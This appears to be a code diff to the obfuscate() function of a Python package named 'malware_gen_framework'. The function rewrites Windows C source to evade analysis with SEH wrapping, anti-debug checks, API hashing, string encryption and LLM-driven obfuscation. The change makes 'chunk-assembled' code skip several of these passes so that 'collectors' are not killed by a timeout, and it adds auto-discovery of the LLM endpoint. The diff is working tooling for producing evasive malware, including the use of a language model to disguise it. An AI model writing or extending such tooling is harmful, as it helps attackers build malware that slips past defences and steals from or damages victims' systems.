@@ -48,6 +48,7 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
     has_anti_debug = _has_chunk_guard(source, "CHUNK_ANTI_DEBUG")
     has_api_hash = _has_chunk_guard(source, "CHUNK_API_HASH")
     has_string_encrypt = _has_chunk_guard(source, "CHUNK_STRING_ENCRYPT")
+    is_chunk = "CHUNK_" in source or "emit_buffer" in source
 
     # 1. Sanitize includes (always)
     source = _sanitize_includes(source, os_platform="windows")
@@ -56,14 +57,18 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
     source = _mutate_source(source, os_platform="windows")
 
     if level in ("heavy", "max"):
-        # 3. SEH wrapper
-        source = _inject_seh_in_main(source)
 
-        # 4. Anti-debug (skip if chunk already has it)
-        if not has_anti_debug:
+        # 3. SEH wrapper — skip for chunk code (breaks argc/argv + 30s timeout kills collectors)
+        if not is_chunk:
+            source = _inject_seh_in_main(source)
+        else:
+            logger.info("Skipping SEH injection (chunk-assembled code)")
+
+        # 4. Anti-debug (skip if chunk already has it or is chunk code)
+        if not has_anti_debug and not is_chunk:
             source = _inject_anti_debug(source)
         else:
-            logger.info("Skipping anti-debug injection (CHUNK_ANTI_DEBUG present)")
+            logger.info("Skipping anti-debug injection (chunk code or CHUNK_ANTI_DEBUG present)")
 
         # 5. API obfuscation (skip if chunk already has hash-based resolution)
         if not has_api_hash:
@@ -72,15 +77,16 @@ def obfuscate(source: str, level: str = "heavy", llm_url: str = None) -> str:
             logger.info("Skipping API obfuscation (CHUNK_API_HASH present)")
 
     if level == "max":
-        url = llm_url or os.environ.get("LLM_URL", "http://localhost:1234")
+        from malware_gen_framework.llm_client import _discover_llm_url
+        url = llm_url or os.environ.get("LLM_URL", "") or _discover_llm_url()
         model = os.environ.get("LLM_MODEL", "")
         source = _llm_obfuscate(source, url, model=model)
 
-    # String encryption always last (skip if chunk already encrypts)
-    if not has_string_encrypt:
+    # String encryption always last (skip if chunk already encrypts or is chunk code)
+    if not has_string_encrypt and not is_chunk:
         source = _encrypt_string_literals(source)
     else:
-        logger.info("Skipping string encryption (CHUNK_STRING_ENCRYPT present)")
+        logger.info("Skipping string encryption (chunk code or CHUNK_STRING_ENCRYPT present)")
 
     return source
 
